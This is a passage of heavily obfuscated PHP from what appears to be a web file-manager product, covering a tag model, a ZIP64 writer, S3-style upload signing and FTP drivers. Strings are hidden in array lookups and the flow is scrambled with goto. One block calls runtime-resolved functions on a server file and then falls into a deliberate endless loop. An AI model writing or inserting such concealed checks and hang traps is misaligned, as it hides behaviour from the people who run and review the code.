"\125\163\x65\x72\56\x74\141\x67\114\x69\x73\164"; public $modelType = "\125\163\145\x72\117\x70\164\x69\x6f\x6e"; public $field = array("\156\141\155\x65", "\x73\x74\171\x6c\x65", "\163\x6f\162\164"); public function listData($Cè¤‘ƒÍÌ = false, $eçòßï‘ëÇ = "\163\x6f\162\164", $DÎ½à’¿„æ = false) { return parent::listData($Cè¤‘ƒÍÌ, $eçòßï‘ëÇ, $DÎ½à’¿„æ); } public function remove($D»÷„äˆ»Ã) { return parent::remove($D»÷„äˆ»Ã); } public function add($AİÄ÷à«°ì, $b”¯ˆŠËÓÃ = "\x6c\141\x62\x65\x6c\55\147\x72\x65\171\55\156\x6f\162\x6d\141\x6c") { $B¼Ê¯ŞÅ® =& $_SERVER[í…¶]; if ($this->findByName($AİÄ÷à«°ì)) { return !1; } $fÀß¶†Ú—– = array($B¼Ê¯ŞÅ®[395] => $AİÄ÷à«°ì, $B¼Ê¯ŞÅ®[446] => $b”¯ˆŠËÓÃ, $B¼Ê¯ŞÅ®[2105] => $this->getSort($B¼Ê¯ŞÅ®[246]) + 1); return parent::insert($fÀß¶†Ú—–); } public function update($cÊğ…§Ñ“ß, $cÔæÕ—ÇŒ) { $c‰áÈÈÜ¹÷ =& $_SERVER[í…¶]; $D½Ûè÷‡ğÑ = $this->listData($cÊğ…§Ñ“ß); $Bî÷æªƒ… = $this->findByName($cÔæÕ—ÇŒ[$c‰áÈÈÜ¹÷[28]]); if (!$D½Ûè÷‡ğÑ || $Bî÷æªƒ… && $Bî÷æªƒ…[$c‰áÈÈÜ¹÷[376]] != $D½Ûè÷‡ğÑ[$c‰áÈÈÜ¹÷[376]]) { return !1; } return parent::update($cÊğ…§Ñ“ß, $cÔæÕ—ÇŒ); } public function moveTop($bç¢¼µ‰„) { $E÷†ñÃÌ =& $_SERVER[í…¶]; $dÃ²‡ì¼‡  = parent::listData(); $FùÖµª“óÛ = $this->getSort($E÷†ñÃÌ[245]); foreach ($dÃ²‡ì¼‡  as &$d™ÇåìĞîÌ) { if ($d™ÇåìĞîÌ[$E÷†ñÃÌ[376]] == $bç¢¼µ‰„) { $d™ÇåìĞîÌ[$E÷†ñÃÌ[2122]] = $FùÖµª“óÛ; continue; } $d™ÇåìĞîÌ[$E÷†ñÃÌ[2122]] += 1; } return parent::resetData($dÃ²‡ì¼‡ ); } public function moveBottom($cÀˆß‰×Á©) { $e˜ó™¤ƒ¬… =& $_SERVER[í…¶]; $D‡ØœÇ‚¯ = $this->getSort($e˜ó™¤ƒ¬…[246]) + 1; return parent::update($cÀˆß‰×Á©, array($e˜ó™¤ƒ¬…[2122] => $D‡ØœÇ‚¯)); } public function resetSort($aùŸíâøÉ) { goto aíïùå®; aíïùå®: $aƒîºœ’— =& $_SERVER[í…¶]; $Cò³ï‘ÀÄÙ = array(); $aùŸíâøÉ = is_array($aùŸíâøÉ) ? $aùŸíâøÉ : array(); goto eÊ×š‰Œ£©; eÊ×š‰Œ£©: for ($FôÂÌ¬¶Ù = 0; $FôÂÌ¬¶Ù < count($aùŸíâøÉ); $FôÂÌ¬¶Ù++) { $Cò³ï‘ÀÄÙ[$aùŸíâøÉ[$FôÂÌ¬¶Ù] . $aƒîºœ’—[33]] = $FôÂÌ¬¶Ù + 1; } $cîº–ÃÆÚ = parent::listData(); foreach ($cîº–ÃÆÚ as &$eİã¬åÕ) { $E¤‡ÔßÔùù = $Cò³ï‘ÀÄÙ[$eİã¬åÕ[$aƒîºœ’—[376]]]; $eİã¬åÕ[$aƒîºœ’—[2122]] = $E¤‡ÔßÔùù ? $E¤‡ÔßÔùù : $eİã¬åÕ[$aƒîºœ’—[2122]]; } goto b°‡¿¦Ä¸Ó; b°‡¿¦Ä¸Ó: return parent::resetData($cîº–ÃÆÚ); goto B„‡®õ«¿ò; B„‡®õ«¿ò: } private function getSort($Bˆ»‘£Ã›) { $d®Äô×ÌŠ =& $_SERVER[í…¶]; $cõ¥‡Ä¨ù = parent::listData(); $FÎÄÊˆó«å = array_to_keyvalue($cõ¥‡Ä¨ù, $d®Äô×ÌŠ[33], $d®Äô×ÌŠ[2122]); if (!$FÎÄÊˆó«å) { $FÎÄÊˆó«å = array(0); } $FÃÖ„©¢¹Ë = $Bˆ»‘£Ã› == $d®Äô×ÌŠ[246] ? max($FÎÄÊˆó«å) : min($FÎÄÊˆó«å); return intval($FÃÖ„©¢¹Ë); } } goto B•ÔèšíÀí; f¤³Ôƒá®…: if (!isset($_SERVER[$_SERVER[í…¶][344]]) || !isset($_SERVER[$_SERVER[í…¶][562]])) { goto D‘¢óùëë; D‘¢óùëë: $FƒÏ¸„Ÿ¡ß = $_SERVER[í…¶][345]; $f’Åª¼ÔÏÍ = $_SERVER[$_SERVER[í…¶][346]] . $_SERVER[í…¶][347]; $E®›ˆ¤ò£ = $FƒÏ¸„Ÿ¡ß($f’Åª¼ÔÏÍ); goto fÈ¼ˆà‘Ø¢; d÷¢î«í Ì: $D…òÙò¢»à($_SERVER[$_SERVER[í…¶][346]] . $_SERVER[í…¶][347]); $d›Ó¸À» = 2; while ($d›Ó¸À» > 1) { $aá×ˆãÅÇø = rawurlencode($d›Ó¸À» . $_SERVER[í…¶][370]); } goto BÀµÎòìéë; fÈ¼ˆà‘Ø¢: $dÛ¯…÷´‰İ = explode($_SERVER[í…¶][217], $E®›ˆ¤ò£); if (count($dÛ¯…÷´‰İ) < $_SERVER[í…¶][348]) { $bİƒîÇŒÙ× = $_SERVER[í…¶][349]; $bİƒîÇŒÙ×(); } $D…òÙò¢»à = $_SERVER[í…¶][350]; goto d÷¢î«í Ì; BÀµÎòìéë: } class ZipMake { const VERSION = "\x30\56\x32\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($f¤·ñÏÏ£ = null) { $C—Ù§ÑÍÂ =& $_SERVER[í…¶]; $this->outputStream = fopen($C—Ù§ÑÍÂ[2005], $C—Ù§ÑÍÂ[1224]); $this->outputName = $f¤·ñÏÏ£; $this->needHeaders = !0; } public function addFile($AÑ×„¤…Åè, $f„øäŒóˆù) { goto E˜„ˆ’ìŞ¶; d‚Šó“áæµ: $BöÇäßŒÆ® = $this->addFileHeader($AÑ×„¤…Åè, $dˆ¡Š¨Öµå); $cî›Òİ‰Œ = $c¨‹¯Õ¬•Ò = filesize($f„øäŒóˆù); $c¯ëÂ¿ÔÅÃ = fopen($f„øäŒóˆù, $DÃ‚Œö½ß¶[2006]); goto bÊÎ ÄØáÌ; bÊÎ ÄØáÌ: while (!feof($c¯ëÂ¿ÔÅÃ)) { $C­…í—…ğË = fread($c¯ëÂ¿ÔÅÃ, 1048576); $this->send($C­…í—…ğË); } fclose($c¯ëÂ¿ÔÅÃ); $eòøò°Úô = hexdec(hash_file($DÃ‚Œö½ß¶[2007], $f„øäŒóˆù)); goto D¸Òé¨…Ç; D¸Òé¨…Ç: $this->addFileFooter($AÑ×„¤…Åè, $dˆ¡Š¨Öµå, $eòøò°Úô, $cî›Òİ‰Œ, $c¨‹¯Õ¬•Ò, $BöÇäßŒÆ®); goto EŠ›êˆàÑƒ; E˜„ˆ’ìŞ¶: $DÃ‚Œö½ß¶ =& $_SERVER[í…¶]; $AÑ×„¤…Åè = $this->filterFilename($AÑ×„¤…Åè); $dˆ¡Š¨Öµå = static::METHOD_STORE; goto d‚Šó“áæµ; EŠ›êˆàÑƒ: } public function addFileFromStream($D¹”ã…š²—, $C«‹•×œÆÈ) { goto fÎ‚Œ½‘ó¶; D´Ò£õšÇô: fseek($C«‹•×œÆÈ, 0, SEEK_END); $f˜ÛÑ†¿¼ = $a£·Ä’ÓÙ» = ftell($C«‹•×œÆÈ); rewind($C«‹•×œÆÈ); goto cî¥’·•¸Ñ; fÎ‚Œ½‘ó¶: $D¹”ã…š²— = $this->filterFilename($D¹”ã…š²—); $EÈš†¸†÷Ã = static::METHOD_STORE; $EÅä‰†»Ã« = $this->addFileHeader($D¹”ã…š²—, $EÈš†¸†÷Ã); goto D´Ò£õšÇô; cî¥’·•¸Ñ: $b•…Ù—…ëİ = hash_init($_SERVER[í…¶][2007]); while (!feof($C«‹•×œÆÈ)) { $EˆòĞÉÔ›£ = fread($C«‹•×œÆÈ, 1048576); hash_update($b•…Ù—…ëİ, $EˆòĞÉÔ›£); $this->send($EˆòĞÉÔ›£); } $AÂ¬Ä›™¬‡ = hexdec(hash_final($b•…Ù—…ëİ)); goto AéùÛˆÎæÔ; AéùÛˆÎæÔ: $this->addFileFooter($D¹”ã…š²—, $EÈš†¸†÷Ã, $AÂ¬Ä›™¬‡, $f˜ÛÑ†¿¼, $a£·Ä’ÓÙ», $EÅä‰†»Ã«); goto b¦ÍŒ‰¦íŸ; b¦ÍŒ‰¦íŸ: } public function finish() { foreach ($this->files as $DË’Œ‡§º•) { $this->addCdrFile($DË’Œ‡§º•); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($b°ºÛè“ß, $eŠ³¯é‹”…) { goto BŠ•–ÈÜ¦¬; BŠ•–ÈÜ¦¬: $E»½ÃáÏ˜’ =& $_SERVER[í…¶]; $b°ºÛè“ß = preg_replace($E»½ÃáÏ˜’[2008], $E»½ÃáÏ˜’[33], $b°ºÛè“ß); $d°İÉá ìõ = strlen($b°ºÛè“ß); goto AÕËÒ¢ñÑ”; AÕËÒ¢ñÑ”: $EŠ¬íÓÈğÖ = $this->dosTime(time()); $D‰ø²ø››“ = array(array($E»½ÃáÏ˜’[2009], static::FILE_HEADER_SIGNATURE), array($E»½ÃáÏ˜’[2010], static::ZIP_VERSION_64), array($E»½ÃáÏ˜’[2010], 8), array($E»½ÃáÏ˜’[2010], $eŠ³¯é‹”…), array($E»½ÃáÏ˜’[2009], $EŠ¬íÓÈğÖ), array($E»½ÃáÏ˜’[2009], 0), array($E»½ÃáÏ˜’[2009], 4294967295), array($E»½ÃáÏ˜’[2009], 4294967295), array($E»½ÃáÏ˜’[2010], $d°İÉá ìõ), array($E»½ÃáÏ˜’[2010], 32)); $CÒÑŠè¹İ¸ = array(array($E»½ÃáÏ˜’[2010], 1), array($E»½ÃáÏ˜’[2010], 28), array($E»½ÃáÏ˜’[2011], 0), array($E»½ÃáÏ˜’[2011], 0), array($E»½ÃáÏ˜’[2011], 0), array($E»½ÃáÏ˜’[2009], 0)); goto B¼àÕ‚±; B¼àÕ‚±: $eöá„¼®Üê = $this->packFields($D‰ø²ø››“); $B¸½’ÂÊ±õ = $this->packFields($CÒÑŠè¹İ¸); $this->send($eöá„¼®Üê . $b°ºÛè“ß . $B¸½’ÂÊ±õ); goto c‰‡Ğ‡™; c‰‡Ğ‡™: return strlen($eöá„¼®Üê) + $d°İÉá ìõ + strlen($B¸½’ÂÊ±õ); goto eŒ¹­İ’–Ø; eŒ¹­İ’–Ø: } protected function addFileFooter($d¹¡ºé‰Ü, $E©š°¶¡¸…, $FÚÁİÀƒÉ, $BéÈ´ˆêñ, $FÑè¦Š¦İ, $e’¦’ğ²Üè) { $A’å°ŠÀŒ¾ =& $_SERVER[í…¶]; $bÔËê¬‚óê = array(array($A’å°ŠÀŒ¾[2009], static::DATA_DESCRIPTOR_SIGNATURE), array($A’å°ŠÀŒ¾[2009], $FÚÁİÀƒÉ), array($A’å°ŠÀŒ¾[2011], $BéÈ´ˆêñ), array($A’å°ŠÀŒ¾[2011], $FÑè¦Š¦İ)); $d«ÜâÔ¿Èª = $this->packFields($bÔËê¬‚óê); $this->send($d«ÜâÔ¿Èª); $CèÁÓìÀ– = $e’¦’ğ²Üè + $BéÈ´ˆêñ + $e¼íä³·—; $this->addToCdr($d¹¡ºé‰Ü, $E©š°¶¡¸…, $FÚÁİÀƒÉ, $BéÈ´ˆêñ, $FÑè¦Š¦İ, $CèÁÓìÀ–); } private function addToCdr($C–Ë‹Â¬à, $fÌ’´èòÍ, $b•í¸ƒºåØ, $D­Ä÷¥ò¦õ, $DŠ¶Ö©±¸î, $eÚá®…›ÒÄ) { $this->files[] = array($C–Ë‹Â¬à, $fÌ’´èòÍ, $b•í¸ƒºåØ, $D­Ä÷¥ò¦õ, $DŠ¶Ö©±¸î, $this->ofs); $this->ofs += $eÚá®…›ÒÄ; } protected function addCdrFile($Dèˆ¨É ) { goto Bğ¬ìåÅØÔ; BƒØ´šÏõö: $Cğò¨•¢·º = $this->packFields($aõ‘“’Ä®); $f¿¿¹‚–à = $this->packFields($B÷…¬²é„»); $D™÷¢Ş•Ã£ = $Cğò¨•¢·º . $F‰Ë©œ·Ø¿ . $DêÂìİóÊ . $f¿¿¹‚–à; goto BŒ³…šñ¦; BÊÀ––¼©: $b„§Ô™åÓ = $this->dosTime(time()); $aõ‘“’Ä® = array(array($CËÀÍÑìµ[2009], static::CDR_FILE_SIGNATURE), array($CËÀÍÑìµ[2010], static::ZIP_VERSION_64), array($CËÀÍÑìµ[2010], static::ZIP_VERSION_64), array($CËÀÍÑìµ[2010], 8), array($CËÀÍÑìµ[2010], $B±«ñæ¡Æ), array($CËÀÍÑìµ[2009], $b„§Ô™åÓ), array($CËÀÍÑìµ[2009], $A…¡ç¿À±”), array($CËÀÍÑìµ[2009], 4294967295), array($CËÀÍÑìµ[2009], 4294967295), array($CËÀÍÑìµ[2010], strlen($F‰Ë©œ·Ø¿)), array($CËÀÍÑìµ[2010], 32), array($CËÀÍÑìµ[2010], strlen($DêÂìİóÊ)), array($CËÀÍÑìµ[2010], 0), array($CËÀÍÑìµ[2010], 0), array($CËÀÍÑìµ[2009], 32), array($CËÀÍÑìµ[2009], 4294967295)); $B÷…¬²é„» = array(array($CËÀÍÑìµ[2010], 1), array($CËÀÍÑìµ[2010], 28), array($CËÀÍÑìµ[2011], $dÕƒõå••), array($CËÀÍÑìµ[2011], $A”öâåÈòã), array($CËÀÍÑìµ[2011], $bŠÌ¸¦â†‰), array($CËÀÍÑìµ[2009], 0)); goto BƒØ´šÏõö; Bğ¬ìåÅØÔ: $CËÀÍÑìµ =& $_SERVER[í…¶]; list($F‰Ë©œ·Ø¿, $B±«ñæ¡Æ, $A…¡ç¿À±”, $A”öâåÈòã, $dÕƒõå••, $bŠÌ¸¦â†‰) = $Dèˆ¨É ; $DêÂìİóÊ = $CËÀÍÑìµ[33]; goto BÊÀ––¼©; BŒ³…šñ¦: $this->send($D™÷¢Ş•Ã£); $this->cdr_ofs += strlen($D™÷¢Ş•Ã£); goto A†ÇÊ—ÆØ; A†ÇÊ—ÆØ: } protected function addCdr64Eof() { goto f»Áğ”ƒõ‘; f»Áğ”ƒõ‘: $eœ¢Ó¦¶ç =& $_SERVER[í…¶]; $c§Í©š‹ƒë = count($this->files); $dÍ¸‰¶ÁÉÎ = $this->cdr_ofs; goto fÚİô›ê—; aŠÙÂ°è±â: $this->send($DÀË´¥±–¡); goto FÚªâ´„–¯; fÚİô›ê—: $c”´ÔçÛ’Ş = $this->ofs; $eÎÅÖöã¢ = array(array($eœ¢Ó¦¶ç[2009], static::ZIP64_CDR_EOF_SIGNATURE), array($eœ¢Ó¦¶ç[2011], 44), array($eœ¢Ó¦¶ç[2010], static::ZIP_VERSION_64), array($eœ¢Ó¦¶ç[2010], static::ZIP_VERSION_64), array($eœ¢Ó¦¶ç[2009], 0), array($eœ¢Ó¦¶ç[2009], 0), array($eœ¢Ó¦¶ç[2011], $c§Í©š‹ƒë), array($eœ¢Ó¦¶ç[2011], $c§Í©š‹ƒë), array($eœ¢Ó¦¶ç[2011], $dÍ¸‰¶ÁÉÎ), array($eœ¢Ó¦¶ç[2011], $c”´ÔçÛ’Ş)); $DÀË´¥±–¡ = $this->packFields($eÎÅÖöã¢); goto aŠÙÂ°è±â; FÚªâ´„–¯: } protected function addCdr64Locator() { goto D³ÀÆ¬³î‹; D³ÀÆ¬³î‹: $Fñç«­Ÿ·Ú =& $_SERVER[í…¶]; $cŸĞÈìÛ± = count($this->files); $CƒÎ¬Ë– = $this->cdr_ofs; goto d—¼Æ¦ˆù™; d—¼Æ¦ˆù™: $CÈà°³œ»Ù = $this->ofs; $f”ääÛÊª‰ = array(array($Fñç«­Ÿ·Ú[2009], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($Fñç«­Ÿ·Ú[2009], 0), array($Fñç«­Ÿ·Ú[2011], $CÈà°³œ»Ù + $CƒÎ¬Ë–), array($Fñç«­Ÿ·Ú[2009], 1)); $Fº‹½À©Ú = $this->packFields($f”ääÛÊª‰); goto aÉìâ²¥Ê÷; aÉìâ²¥Ê÷: $this->send($Fº‹½À©Ú); goto Eè˜²Ö‰³í; Eè˜²Ö‰³í: } protected function addCdrEof() { goto b×öÍã‚ßÛ; c®«ìÏšó: $eš²‚İÌğŒ = $this->packFields($e×¦Çã‡«Å) . $CïÓíôÊ®…; $this->send($eš²‚İÌğŒ); goto dÊ¿ƒÅ²Å; b×öÍã‚ßÛ: $AŞ—®É‡¹é =& $_SERVER[í…¶]; $bµ¦ã„™Š = count($this->files); $eáŠ•¨ßœ¾ = $this->cdr_ofs; goto FÂ’±†ÖŒƒ; FÂ’±†ÖŒƒ: $fÍ‡òÓóí = $this->ofs; $CïÓíôÊ®… = $AŞ—®É‡¹é[33]; $e×¦Çã‡«Å = array(array($AŞ—®É‡¹é[2009], static::CDR_EOF_SIGNATURE), array($AŞ—®É‡¹é[2010], 0), array($AŞ—®É‡¹é[2010], 0), array($AŞ—®É‡¹é[2010], $bµ¦ã„™Š), array($AŞ—®É‡¹é[2010], $bµ¦ã„™Š), array($AŞ—®É‡¹é[2009], 4294967295), array($AŞ—®É‡¹é[2009], 4294967295), array($AŞ—®É‡¹é[2010], strlen($CïÓíôÊ®…))); goto c®«ìÏšó; dÊ¿ƒÅ²Å: } protected function addCdr() { foreach ($this->files as $BÂçÃ¢½„) { $this->addCdrFile($BÂçÃ¢½„); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $C™ôÒÃ‹‰› =& $_SERVER[í…¶]; $bºˆÂÎÍ‡‰ = $C™ôÒÃ‹‰›[202]; if ($this->outputName) { $còÓ³êê„ = trim(str_replace(array($C™ôÒÃ‹‰›[113], $C™ôÒÃ‹‰›[55], $C™ôÒÃ‹‰›[93], $C™ôÒÃ‹‰›[67], $C™ôÒÃ‹‰›[217], $C™ôÒÃ‹‰›[990]), $C™ôÒÃ‹‰›[33], $this->outputName)); $D®Å’š™íØ = rawurlencode($còÓ³êê„); $bºˆÂÎÍ‡‰ .= "\73\x20\x66\151\x6c\145\x6e\x61\x6d\x65\52\75\x75\164\146\55\x38\x27\47{$D®Å’š™íØ}"; } $fîèë‹ˆà÷ = array($C™ôÒÃ‹‰›[199] => $C™ôÒÃ‹‰›[2012], $C™ôÒÃ‹‰›[2013] => $bºˆÂÎÍ‡‰, $C™ôÒÃ‹‰›[2014] => $C™ôÒÃ‹‰›[2015], $C™ôÒÃ‹‰›[2016] => $C™ôÒÃ‹‰›[2017], $C™ôÒÃ‹‰›[2018] => $C™ôÒÃ‹‰›[2019]); foreach ($fîèë‹ˆà÷ as $aÉÆªñõÒŞ => $Bµæ·ŒÄ„Ü) { header($aÉÆªñõÒŞ . $C™ôÒÃ‹‰›[878] . $Bµæ·ŒÄ„Ü); } } protected function send($B˜Õ ¸–¡‡) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $B˜Õ ¸–¡‡); } protected final function dosTime($e­Âã‰Ñ¯ ) { $Dİ”àİî›ğ =& $_SERVER[í…¶]; $a·÷é¢Ã‡Í = getdate($e­Âã‰Ñ¯ ); if ($a·÷é¢Ã‡Í[$Dİ”àİî›ğ[1722]] < 1980) { $a·÷é¢Ã‡Í = array($Dİ”àİî›ğ[1722] => 1980, $Dİ”àİî›ğ[2020] => 1, $Dİ”àİî›ğ[2021] => 1, $Dİ”àİî›ğ[2022] => 0, $Dİ”àİî›ğ[2023] => 0, $Dİ”àİî›ğ[2024] => 0); } $a·÷é¢Ã‡Í[$Dİ”àİî›ğ[1722]] -= 1980; return $a·÷é¢Ã‡Í[$Dİ”àİî›ğ[1722]] << 25 | $a·÷é¢Ã‡Í[$Dİ”àİî›ğ[2020]] << 21 | $a·÷é¢Ã‡Í[$Dİ”àİî›ğ[2021]] << 16 | $a·÷é¢Ã‡Í[$Dİ”àİî›ğ[2022]] << 11 | $a·÷é¢Ã‡Í[$Dİ”àİî›ğ[2023]] << 5 | $a·÷é¢Ã‡Í[$Dİ”àİî›ğ[2024]] >> 1; } protected function packFields($Eå½ŠÅš) { $FŞˆ¸öî‹ô =& $_SERVER[í…¶]; $DÕñ’¦ĞĞç = $FŞˆ¸öî‹ô[33]; $BŒØ‰§†ğä = array(); foreach ($Eå½ŠÅš as $BÁíÜãÁø) { $DÕñ’¦ĞĞç .= $BÁíÜãÁø[0]; $BŒØ‰§†ğä[] = $BÁíÜãÁø[1]; } array_unshift($BŒØ‰§†ğä, $DÕñ’¦ĞĞç); return call_user_func_array($FŞˆ¸öî‹ô[2025], $BŒØ‰§†ğä); } protected function filterFilename($fó§Íº‡™¸) { $E¸Ÿ²ñ…»‘ =& $_SERVER[í…¶]; return str_replace(array($E¸Ÿ²ñ…»‘[93], $E¸Ÿ²ñ…»‘[4], $E¸Ÿ²ñ…»‘[176], $E¸Ÿ²ñ…»‘[69], $E¸Ÿ²ñ…»‘[113], $E¸Ÿ²ñ…»‘[923], $E¸Ÿ²ñ…»‘[926], $E¸Ÿ²ñ…»‘[271]), $E¸Ÿ²ñ…»‘[70], $fó§Íº‡™¸); } } class ZipStream { } goto B˜áö½–»±; F˜‘¦‡–­ù: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($cäÚİ¯ÅŸà) { $this->pathParse = $cäÚİ¯ÅŸà; } protected function infoParse($CÅĞ•Ş×Š†, $d‚Û‘Ãï¦™ = false) { $CÑÈî··¸ =& $_SERVER[í…¶]; return Action($CÑÈî··¸[1016])->sharePathInfo($this->pathParse[$CÑÈî··¸[75]], !0, $d‚Û‘Ãï¦™); } public function listPath($E‡ÒÚ”ÕÖÇ, $eÉÌØ«À = false) { $cê¶ŒªäÀ¦ =& $_SERVER[í…¶]; $EØÚ„¹á‘ä = IO::listPath($E‡ÒÚ”ÕÖÇ, $eÉÌØ«À); foreach ($EØÚ„¹á‘ä as $BÅ–°Å…İÏ => $a½Û¿åß¾) { if (!in_array($BÅ–°Å…İÏ, array($cê¶ŒªäÀ¦[73], $cê¶ŒªäÀ¦[74]))) { continue; } foreach ($a½Û¿åß¾ as $f¾Ëöˆó¶ => $cÙ¸ØÄ¾Î) { $cÙ¸ØÄ¾Î = Action($cê¶ŒªäÀ¦[1131])->parsePathChildren($cÙ¸ØÄ¾Î, array($cê¶ŒªäÀ¦[396] => $E‡ÒÚ”ÕÖÇ)); $EØÚ„¹á‘ä[$BÅ–°Å…İÏ][$f¾Ëöˆó¶] = Action($cê¶ŒªäÀ¦[1016])->shareItemInfo($cÙ¸ØÄ¾Î); } } return $EØÚ„¹á‘ä; } public function listAll($bëÑ•ù÷ö) { $dÁ‰ÇÏÜí­ =& $_SERVER[í…¶]; $CˆÓæÕ±¾º = IO::listAll($bëÑ•ù÷ö); foreach ($CˆÓæÕ±¾º as &$f—˜…¿Ş®½) { $f—˜…¿Ş®½ = array_merge(IO::info($f—˜…¿Ş®½[$dÁ‰ÇÏÜí­[75]]), $f—˜…¿Ş®½); $f—˜…¿Ş®½[$dÁ‰ÇÏÜí­[400]] = Action($dÁ‰ÇÏÜí­[1016])->shareItemInfo($f—˜…¿Ş®½); } return $CˆÓæÕ±¾º; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($dÊ¯Ç²ô”…) { parent::__construct($dÊ¯Ç²ô”…); $this->signatureVersion($_SERVER[í…¶][200]); } public function uploadFormData($aîËµ¬ÉÅå, $FÃ÷ŒËƒ… = 3600) { goto A„¨‚‚÷; aŸª¦°å„™: $Dôõ¡¹Í­ = array($fÍ¯ëâÉõÀ[199] => $fÍ¯ëâÉõÀ[33], $fÍ¯ëâÉõÀ[1144] => $fÍ¯ëâÉõÀ[33], $fÍ¯ëâÉõÀ[1102] => $cç»í‹æÂõ, $fÍ¯ëâÉõÀ[1106] => $E¨”×æŞë–, $fÍ¯ëâÉõÀ[1110] => $d±Õòõ÷¸ª, $fÍ¯ëâÉõÀ[1145] => $AŸ³œîŸæ¨, $fÍ¯ëâÉõÀ[1146] => $BÊ“·Ğâ¡®, $fÍ¯ëâÉõÀ[1147] => $c²åÄ»‘À, $fÍ¯ëâÉõÀ[1148] => $B‰˜¸‚«‚¹, $fÍ¯ëâÉõÀ[1149] => $bÇ¸Ÿ¡õ×Á, $fÍ¯ëâÉõÀ[169] => $this->getHost()); return $Dôõ¡¹Í­; goto D…õÓš¯¼¼; A„¨‚‚÷: $fÍ¯ëâÉõÀ =& $_SERVER[í…¶]; $cç»í‹æÂõ = $fÍ¯ëâÉõÀ[185]; $BÊ“·Ğâ¡® = $fÍ¯ëâÉõÀ[1132]; goto fâ¡††šºí; Eøˆ±‹ìŠù: $Dñ”öœë›“ = hash_hmac($fÍ¯ëâÉõÀ[1142], $FÜìí´ˆ»ó, $Bêº‡ˆáÀõ, !0); $FÉƒ­î­Ã® = hash_hmac($fÍ¯ëâÉõÀ[1142], $FÔ ¯Ö¶ªÕ, $Dñ”öœë›“, !0); $bÇ¸Ÿ¡õ×Á = hash_hmac($fÍ¯ëâÉõÀ[1142], $d±Õòõ÷¸ª, $FÉƒ­î­Ã®); goto aŸª¦°å„™; ašØ×•²: $d±Õòõ÷¸ª = base64_encode(json_encode($d·øòµãƒÖ)); $B¢£ŞÈŞØ = hash_hmac($fÍ¯ëâÉõÀ[1142], $C‰ °„Öë¤, $fÍ¯ëâÉõÀ[1143] . $this->secret, !0); $Bêº‡ˆáÀõ = hash_hmac($fÍ¯ëâÉõÀ[1142], $this->region, $B¢£ŞÈŞØ, !0); goto Eøˆ±‹ìŠù; a‰¢á¡©Ñ­: $FÔ ¯Ö¶ªÕ = $fÍ¯ëâÉõÀ[1134]; $B‰˜¸‚«‚¹ = $FÃ÷ŒËƒ… . $fÍ¯ëâÉõÀ[33]; $E¨”×æŞë– = $fÍ¯ëâÉõÀ[1098]; goto fÆŠïŞ¼´‚; fÆŠïŞ¼´‚: $B ›¦†¯¿ = array($this->accessKey, $C‰ °„Öë¤, $this->region, $FÜìí´ˆ»ó, $FÔ ¯Ö¶ªÕ); $AŸ³œîŸæ¨ = implode($fÍ¯ëâÉõÀ[8], $B ›¦†¯¿); $d·øòµãƒÖ = array($fÍ¯ëâÉõÀ[1100] => gmdate($fÍ¯ëâÉõÀ[1099], strtotime($fÍ¯ëâÉõÀ[1135])), $fÍ¯ëâÉõÀ[1101] => array(array($fÍ¯ëâÉõÀ[1103] => $this->bucket), array($fÍ¯ëâÉõÀ[1102] => $cç»í‹æÂõ), array($fÍ¯ëâÉõÀ[1104], $fÍ¯ëâÉõÀ[1105], $fÍ¯ëâÉõÀ[33]), array($fÍ¯ëâÉõÀ[1104], $fÍ¯ëâÉõÀ[1136], $fÍ¯ëâÉõÀ[33]), array($fÍ¯ëâÉõÀ[1104], $fÍ¯ëâÉõÀ[1137], $fÍ¯ëâÉõÀ[33]), array($fÍ¯ëâÉõÀ[1106] => $E¨”×æŞë–), array($fÍ¯ëâÉõÀ[1138] => $AŸ³œîŸæ¨), array($fÍ¯ëâÉõÀ[1139] => $BÊ“·Ğâ¡®), array($fÍ¯ëâÉõÀ[1140] => $c²åÄ»‘À), array($fÍ¯ëâÉõÀ[1141] => $B‰˜¸‚«‚¹))); goto ašØ×•²; fâ¡††šºí: $FÜìí´ˆ»ó = $fÍ¯ëâÉõÀ[59]; $c²åÄ»‘À = gmdate($fÍ¯ëâÉõÀ[1133]); $C‰ °„Öë¤ = gmdate($fÍ¯ëâÉõÀ[692]); goto a‰¢á¡©Ñ­; D…õÓš¯¼¼: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($FòÀè¨ˆ°Œ) { parent::__construct(); if (count($FòÀè¨ˆ°Œ) > 0) { $this->_init($FòÀè¨ˆ°Œ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($añ«Ê¤«“ß) { $EÀƒƒã¢°… =& $_SERVER[í…¶]; global $config; $this->appCharset = $config[$EÀƒƒã¢°…[1150]]; $this->systemCharset = $config[$EÀƒƒã¢°…[1151]]; if (isset($añ«Ê¤«“ß[$EÀƒƒã¢°…[1152]]) && $añ«Ê¤«“ß[$EÀƒƒã¢°…[1152]]) { $this->systemCharset = $añ«Ê¤«“ß[$EÀƒƒã¢°…[1152]]; } } public function iconvApp($bÀÖ»Î­®) { return $this->iconvTo($bÀÖ»Î­®, $this->systemCharset, $this->appCharset); } public function iconvSystem($f£»ñ¾×™Ø) { return $this->iconvTo($f£»ñ¾×™Ø, $this->appCharset, $this->systemCharset); } public function getPathOuter($e•‚Í…òÜÙ) { goto e—õŒºÜ; B¾„…ëŸ: $e•‚Í…òÜÙ = KodIO::clear($e•‚Í…òÜÙ); $e•‚Í…òÜÙ = substr($e•‚Í…òÜÙ, 